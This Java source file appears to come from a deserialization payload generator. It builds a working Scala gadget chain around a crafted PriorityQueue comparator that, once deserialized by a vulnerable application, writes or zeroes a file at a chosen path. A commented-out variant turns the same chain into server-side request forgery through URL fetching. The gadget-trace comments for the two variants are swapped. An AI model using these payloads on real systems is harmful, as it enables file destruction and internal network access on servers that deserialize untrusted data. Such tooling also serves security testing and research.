package com.ppp.chain.others;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import scala.Function0;
import scala.Function1;
import scala.PartialFunction;
import scala.math.Ordering$;
import scala.sys.process.processInternal$;

import java.io.File;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
@Dependencies({"org.scala-lang:scala-library:2.12.6"})
@Authors({Authors.JACKOFMOSTTRADES})
@Sink({Sink.Default})
public class Scala implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Scala.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain((String) sinkObject);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        /**
         * File Write Zero
         */
            /*
       Gadget chain:
           ObjectInputStream.readObject()
               PriorityQueue.readObject()
                   scala.math.Ordering$$anon$5.compare()
                       scala.PartialFunction$OrElse.apply()
                           scala.sys.process.processInternal$$anonfun$onIOInterrupt$1.applyOrElse()
                               scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1.apply()
                                   java.net.URL.openStream()
    */
        Class<?> clazz = Class.forName("scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3");
        Function0<Object> pbf = (Function0<Object>) Reflections.createWithoutConstructor(clazz);
        Reflections.setFieldValue(pbf, "file$1", new File(command));
        Reflections.setFieldValue(pbf, "append$1", false);

        return createExploit(pbf);

//        /**
//         * SSRF
//         */
//        /*
//        Gadget chain:
//            ObjectInputStream.readObject()
//                PriorityQueue.readObject()
//                    scala.math.Ordering$$anon$5.compare()
//                        scala.PartialFunction$OrElse.apply()
//                            scala.sys.process.processInternal$$anonfun$onIOInterrupt$1.applyOrElse()
//                                scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3.apply()
//                                    java.io.FileOutputStream.<init>()
//     */
//        Class<?> clazz = Class.forName("scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1");
//        Function0<Object> pbf = (Function0<Object>)Reflections.createWithoutConstructor(clazz);
//        Reflections.setFieldValue(pbf, "url$1", new URL(command));
//
//        return createExploit(pbf);
    }

    private static PriorityQueue<Throwable> createExploit(Function0<Object> exploitFunction) throws Exception {
        PartialFunction<Throwable, Object> onf = processInternal$.MODULE$.onInterrupt(exploitFunction);

        Function1<Throwable, Object> f = new PartialFunction.OrElse(onf, onf);

        // create queue with numbers and basic comparator
        final PriorityQueue<Throwable> queue = new PriorityQueue<Throwable>(2, new Comparator<Throwable>() {
            @Override
            public int compare(Throwable o1, Throwable o2) {
                return 0;
            }
        });

        // stub data for replacement later
        queue.add(new Exception());
        queue.add(new Exception());
        Reflections.setFieldValue(queue, "comparator", Ordering$.MODULE$.<Throwable, Object>by(f, null));

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = new InterruptedException();
        queueArray[1] = new InterruptedException();

        return queue;
    }
}